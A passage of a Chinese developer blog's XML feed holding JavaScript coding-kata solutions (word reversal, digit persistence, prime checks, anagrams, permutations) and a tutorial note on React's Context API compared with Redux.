function_">spinWords</span>( <span class="string">&quot;This is a test&quot;</span>) =&gt; returns <span class="string">&quot;This is a test&quot;</span>  </span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="title function_">spinWords</span>( <span class="string">&quot;This is another test&quot;</span> )=&gt; returns <span class="string">&quot;This is rehtona test&quot;</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">翻转长度大于等于<span class="number">5</span>的单词</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; mine<br>function spinWords(str){<br>   return str.split(‘ ‘).map(v &#x3D;&gt; v.length&gt;&#x3D;5 ? v.split(‘’).reverse().join(‘’) : v ).join(‘ ‘)<br>}</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```<span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// the best</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">spinWords</span>(<span class="params">string</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span> string.<span class="title function_">replace</span>(<span class="regexp">/\w&#123;5,&#125;/g</span>, <span class="keyword">function</span>(<span class="params">w</span>) &#123; <span class="keyword">return</span> w.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>) &#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="2019-x2F-6-x2F-28"><a href="#2019-x2F-6-x2F-28" class="headerlink" title="2019&#x2F;6&#x2F;28"></a><em>2019&#x2F;6&#x2F;28</em></h1><ul><li><h1 id="Persistent-Bugger"><a href="#Persistent-Bugger" class="headerlink" title="Persistent Bugger"></a>Persistent Bugger</h1></li></ul><blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">persistence(<span class="number">39</span>) === <span class="number">3</span> <span class="regexp">//</span> because <span class="number">3</span>*<span class="number">9</span> = <span class="number">27</span>, <span class="number">2</span>*<span class="number">7</span> = <span class="number">14</span>, <span class="number">1</span>*<span class="number">4</span>=<span class="number">4</span></span><br><span class="line">                      <span class="regexp">//</span> and <span class="number">4</span> has only one digit</span><br><span class="line"></span><br><span class="line">persistence(<span class="number">999</span>) === <span class="number">4</span> <span class="regexp">//</span> because <span class="number">9</span>*<span class="number">9</span>*<span class="number">9</span> = <span class="number">729</span>, <span class="number">7</span>*<span class="number">2</span>*<span class="number">9</span> = <span class="number">126</span>,</span><br><span class="line">                       <span class="regexp">//</span> <span class="number">1</span>*<span class="number">2</span>*<span class="number">6</span> = <span class="number">12</span>, and finally <span class="number">1</span>*<span class="number">2</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">persistence(<span class="number">4</span>) === <span class="number">0</span> <span class="regexp">//</span> because <span class="number">4</span> is already a one-digit number</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">persistence</span>(<span class="params">num</span>) &#123;</span><br><span class="line">  let index = <span class="number">0</span></span><br><span class="line">  let result = num</span><br><span class="line">  <span class="keyword">while</span> (result.toString().<span class="built_in">length</span> !== <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(result)</span><br><span class="line">    result = result.toString().<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="built_in">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc*cur, <span class="number">1</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line">const persistence = <span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;num&#125;</span>`</span>.<span class="built_in">length</span> &gt; <span class="number">1</span> </span><br><span class="line">    ? <span class="number">1</span> + persistence(<span class="string">`<span class="subst">$&#123;num&#125;</span>`</span>.<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="built_in">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a * +b)) </span><br><span class="line">    : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h1 id="Is-a-number-prime"><a href="#Is-a-number-prime" class="headerlink" title="Is a number prime"></a>Is a number prime</h1></li></ul><blockquote><p>is_prime(1)  &#x2F;* false <em>&#x2F;<br>is_prime(2)  &#x2F;</em> true  <em>&#x2F;<br>is_prime(-1) &#x2F;</em> false *&#x2F;<br>是否为质数</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// mine</span><br><span class="line"><span class="keyword">function</span> <span class="title">isPrime</span>(num) &#123;</span><br><span class="line">  let result = 0</span><br><span class="line">  for (let i=1;i&lt;=num;i++)&#123;</span><br><span class="line">    num % i === 0 ? result += 1 : <span class="keyword"><span class="keyword">null</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">result</span> === <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">// <span class="keyword">function</span> <span class="title">isPrime</span>(num) &#123;</span><br><span class="line">//   <span class="keyword">return</span> <span class="type">[...Array(num).keys()].reduce((acc,</span> cur, index) =&gt; num%(index+<span class="number">1</span>)===<span class="number">0</span>?acc+=<span class="number">1</span>:acc,<span class="number">0</span>) === <span class="number">2</span></span><br><span class="line">// &#125; // 此方法会出现数组最大长度BUG</span><br></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line">function isPrime(<span class="built_in">num</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">2</span>; i &lt; <span class="built_in">num</span>; i++) <span class="keyword">if</span> (<span class="built_in">num</span> % i == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">num</span> &gt;= <span class="number">2</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h1 id="Where-my-anagrams-at"><a href="#Where-my-anagrams-at" class="headerlink" title="Where my anagrams at?"></a>Where my anagrams at?</h1></li></ul><blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;abba&#x27;</span> &amp; <span class="string">&#x27;baab&#x27;</span> == true</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;abba&#x27;</span> &amp; <span class="string">&#x27;bbaa&#x27;</span> == true</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;abba&#x27;</span> &amp; <span class="string">&#x27;abbba&#x27;</span> == false</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;abba&#x27;</span> &amp; <span class="string">&#x27;abca&#x27;</span> == false</span><br><span class="line"></span><br><span class="line">&gt;<span class="built_in">anagrams</span>(<span class="string">&#x27;abba&#x27;</span>, <span class="selector-attr">[<span class="string">&#x27;aabb&#x27;</span>, <span class="string">&#x27;abcd&#x27;</span>, <span class="string">&#x27;bbaa&#x27;</span>, <span class="string">&#x27;dada&#x27;</span>]</span>) =&gt; <span class="selector-attr">[<span class="string">&#x27;aabb&#x27;</span>, <span class="string">&#x27;bbaa&#x27;</span>]</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="built_in">anagrams</span>(<span class="string">&#x27;racer&#x27;</span>, <span class="selector-attr">[<span class="string">&#x27;crazer&#x27;</span>, <span class="string">&#x27;carer&#x27;</span>, <span class="string">&#x27;racar&#x27;</span>, <span class="string">&#x27;caers&#x27;</span>, <span class="string">&#x27;racer&#x27;</span>]</span>) =&gt; <span class="selector-attr">[<span class="string">&#x27;carer&#x27;</span>, <span class="string">&#x27;racer&#x27;</span>]</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="built_in">anagrams</span>(<span class="string">&#x27;laser&#x27;</span>, <span class="selector-attr">[<span class="string">&#x27;lazing&#x27;</span>, <span class="string">&#x27;lazy&#x27;</span>,  <span class="string">&#x27;lacer&#x27;</span>]</span>) =&gt; <span class="selector-attr">[]</span></span><br></pre></td></tr></table></figure></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">anagrams</span>(<span class="params">word, words</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> words.<span class="built_in">filter</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="built_in">sort</span>().join(<span class="string">&#x27;&#x27;</span>) === word.<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="built_in">sort</span>().join(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line">String.prototype.<span class="built_in">sort</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> this.<span class="built_in">split</span>(<span class="string">&quot;&quot;</span>).<span class="built_in">sort</span>().join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">anagrams</span>(<span class="params">word, words</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> words.<span class="built_in">filter</span>(<span class="keyword">function</span>(<span class="params">x</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> x.<span class="built_in">sort</span>() === word.<span class="built_in">sort</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2019-x2F-7-x2F-9"><a href="#2019-x2F-7-x2F-9" class="headerlink" title="2019&#x2F;7&#x2F;9"></a><em>2019&#x2F;7&#x2F;9</em></h1><ul><li><h1 id="Permutations"><a href="#Permutations" class="headerlink" title="Permutations"></a>Permutations</h1></li></ul><blockquote><p>您必须创建输入字符串的所有排列并删除重复项（如果存在）。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">permutations(<span class="string">&#x27;a&#x27;</span>); <span class="regexp">//</span> [<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">permutations(<span class="string">&#x27;ab&#x27;</span>); <span class="regexp">//</span> [<span class="string">&#x27;ab&#x27;</span>, <span class="string">&#x27;ba&#x27;</span>]</span><br><span class="line">permutations(<span class="string">&#x27;aabb&#x27;</span>); <span class="regexp">//</span> [<span class="string">&#x27;aabb&#x27;</span>, <span class="string">&#x27;abab&#x27;</span>, <span class="string">&#x27;abba&#x27;</span>, <span class="string">&#x27;baab&#x27;</span>, <span class="string">&#x27;baba&#x27;</span>, <span class="string">&#x27;bbaa&#x27;</span>]</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine  </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">permutations</span>(<span class="params">string</span>) &#123;</span><br><span class="line">  let <span class="built_in">array</span> = string.<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  let arr = []</span><br><span class="line">  <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    let str = <span class="built_in">array</span>.<span class="built_in">sort</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> Math.<span class="built_in">random</span>() - <span class="number">0.5</span></span><br><span class="line">    &#125;).join(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    arr.<span class="built_in">push</span>(str)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> Set(arr))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">permutations</span>(<span class="params">str</span>) &#123;</span><br><span class="line"> <span class="keyword">return</span> (str.<span class="built_in">length</span> &lt;= <span class="number">1</span>) ? [str] :</span><br><span class="line">         <span class="built_in">Array</span>.from(<span class="keyword">new</span> Set(</span><br><span class="line">           str.<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">              .<span class="built_in">map</span>(<span class="function">(<span class="params">char, i</span>) =&gt;</span> permutations(str.substr(<span class="number">0</span>, i) + str.substr(i + <span class="number">1</span>)).<span class="built_in">map</span>(<span class="function"><span class="params">p</span> =&gt;</span> char + p))</span><br><span class="line">              .<span class="built_in">reduce</span>(<span class="function">(<span class="params">r, x</span>) =&gt;</span> r.concat(x), [])</span><br><span class="line">         ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2019-x2F-7-x2F-14"><a href="#2019-x2F-7-x2F-14" class="headerlink" title="2019&#x2F;7&#x2F;14"></a><em>2019&#x2F;7&#x2F;14</em></h1><ul><li><h1 id="First-non-repeating-character"><a href="#First-non-repeating-character" class="headerlink" title="First non-repeating character"></a>First non-repeating character</h1></li></ul><blockquote><p>‘a’ &#x3D;&gt; ‘a’<br>‘stress’ &#x3D;&gt; ‘t’<br>‘Moonmen’ &#x3D;&gt; ‘e’</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mine</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">firstNonRepeatingLetter</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  const result = []</span><br><span class="line">  s.toLowerCase().<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="built_in">filter</span>(<span class="function">(<span class="params">v,i,arr</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>( arr.<span class="built_in">indexOf</span>(v) === arr.lastIndexOf(v) ) &#123; </span><br><span class="line">      <span class="built_in">console</span>.<span class="built_in">log</span>(v, i, s.<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>)[i])</span><br><span class="line">      result.<span class="built_in">push</span>(s.<span class="built_in">split</span>(<span class="string">&#x27;&#x27;</span>)[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> result[<span class="number">0</span>] || <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the best</span></span><br><span class="line"><span class="keyword">function</span> first<span class="constructor">NonRepeatingLetter(<span class="params">s</span>)</span> &#123;</span><br><span class="line">  var t=s.<span class="keyword">to</span><span class="constructor">LowerCase()</span>;</span><br><span class="line">  <span class="keyword">for</span> (var x=<span class="number">0</span>;x&lt;t.length;x++)</span><br><span class="line">    <span class="keyword">if</span>(t.index<span class="constructor">Of(<span class="params">t</span>[<span class="params">x</span>])</span><span class="operator"> === </span>t.last<span class="constructor">IndexOf(<span class="params">t</span>[<span class="params">x</span>])</span>)</span><br><span class="line">      return s<span class="literal">[<span class="identifier">x</span>]</span>;</span><br><span class="line">  return <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高效学习 react 笔记五：Context API</title>
      <link href="/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%BA%94%EF%BC%9AContext_API/index/"/>
      <url>/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%BA%94%EF%BC%9AContext_API/index/</url>
      
        <content type="html"><![CDATA[<p>假设我们现在遇到如下场景：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">function</span> <span class="function"><span class="title">fn1</span>()&#123;</span></span><br><span class="line"><span class="function">  <span class="title">fn2</span>()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="function"><span class="title">fn2</span>()&#123;</span></span><br><span class="line"><span class="function">  <span class="title">fn3</span>()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="function"><span class="title">fn3</span>()&#123;</span></span><br><span class="line"><span class="function">  <span class="title">fn4</span>()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="function"><span class="title">fn4</span>()&#123;</span></span><br><span class="line"><span class="function">  <span class="variable">console.log</span>(...) <span class="comment">// 我想在这里打印出n的值</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&#123;</span></span><br><span class="line"><span class="function">  <span class="variable">let</span> <span class="variable">n</span> = <span class="number">99</span>;</span></span><br><span class="line"><span class="function">  <span class="title">fn1</span>()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然最简单的思路不就是直接把 <code>n</code> 当作参数，一层一层往下传不就好了。</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">function</span> <span class="title function_">fn1</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="title function_">fn2</span>(<span class="variable">n</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="title function_">fn2</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="title function_">fn3</span>(<span class="variable">n</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="title function_">fn3</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="title function_">fn4</span>(<span class="variable">n</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="title function_">fn4</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="variable">console</span>.<span class="property">log</span>(<span class="variable">n</span>) <span class="comment">// 99</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">let</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">99</span>;</span><br><span class="line">  <span class="title function_">fn1</span>(<span class="variable">n</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就能在 <code>fn4</code> 中打印出 <code>n</code> 的值。</p><p>但是这样一层层的传递似乎也很麻烦，那我们能不能创造出一个简便的方法呢~</p><p>我们再试试把变量 <code>n</code> 提升成全局变量：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">let</span> <span class="variable">n</span> = <span class="number">99</span></span><br><span class="line"><span class="variable">function</span> <span class="function"><span class="title">fn1</span>()&#123;</span></span><br><span class="line"><span class="function">  <span class="title">fn2</span>()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="function"><span class="title">fn2</span>()&#123;</span></span><br><span class="line"><span class="function">  <span class="title">fn3</span>()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="function"><span class="title">fn3</span>()&#123;</span></span><br><span class="line"><span class="function">  <span class="title">fn4</span>()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">function</span> <span class="function"><span class="title">fn4</span>()&#123;</span></span><br><span class="line"><span class="function">  <span class="variable">console.log</span>(<span class="variable">n</span>) <span class="comment">// 99</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&#123;</span></span><br><span class="line"><span class="function">  <span class="title">fn1</span>()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们确实能快速打印出 <code>n</code> 的变量，但是我们为此创建了一个全局变量，这又引发了了一个更麻烦的问题！<strong>全局变量污染</strong></p><p>所以我们能不能发明一种更好的方法呢~</p><p>比如说 “局部的全局变量” ， 只能 <code>n</code> 在函数中能访问，外部访问不到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> x = &#123;&#125;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">setN</span> = <span class="keyword">function</span> (<span class="params">key, data</span>) &#123;</span><br><span class="line">    x[key] = data</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">fn1</span> = <span class="keyword">function</span> <span class="title function_">fn1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">fn2</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">fn3</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">fn4</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn4</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x.<span class="property">n</span>) <span class="comment">// 99</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">setN</span>(<span class="string">&#x27;n&#x27;</span>, <span class="number">99</span>)</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">fn1</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这样一来，我们通过向外部暴露一个 <code>set</code> 方法就能去改变 <code>n</code> 的值，<code>fn4</code> 又能直接访问 <code>n</code> 的值，这种操作就是今天要介绍的 <strong>Context API</strong></p></blockquote><p>我们拿出<a href="https://www.jianshu.com/p/b3c8f576f8a6">上文</a>的<a href="http://js.jirengu.com/xusoh/6/edit?js,output">例子</a>来改写。</p><p>我们直接通过 <code>const moneyContext = React.createContext()</code> 创建一个 <code>context</code>，</p><p>然后将父组件通过 <code>moneyContext.Provider</code> 包起来，并传递一个 <code>value=&#123;money.money&#125;</code> 的 <code>props</code></p><p>接下来我们如果在哪个子组件中使用，只需要在子组件外层包一个 <code>&lt;moneyContext.Consumer&gt;</code> 然后通过函数的形式，在函数的参数中拿到传递的值即可。</p><p><a href="http://js.jirengu.com/hazil/7/edit?js,output">完整代码在此</a></p><p>这样我们就在子组件中直接传递了 <code>money</code>，但是如果这个变量是我们在父组件中生命的，子组件中无法更改（永远不要试图去更改从 <code>props</code> 传递下来的值），那我们如果想在子组件中也更改这个值呢~</p><p>很显然，我们当初在 <code>value</code> 中传递的是值，我们直接传递一个包括更改 <code>money</code> 方法的对象不就好了，</p><p>所以代码就变成了<a href="http://js.jirengu.com/viqiq/6/edit?js,output">这个样子</a></p><blockquote><p>最终我们用 <code>Context</code> 也达到了和 <code>redux</code> 的效果。并且写法也很像 (Provider) ，<br>所以似乎再简单应用上，我们完全可以用 <code>Context</code> 代替 <code>Redux</code>。  :）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高效学习 react 笔记四：redux 和 react-redux</title>
      <link href="/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E5%9B%9B%EF%BC%9Aredux%E5%92%8Creact-redux/index/"/>
      <url>/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E5%9B%9B%EF%BC%9Aredux%E5%92%8Creact-redux/index/</url>
      
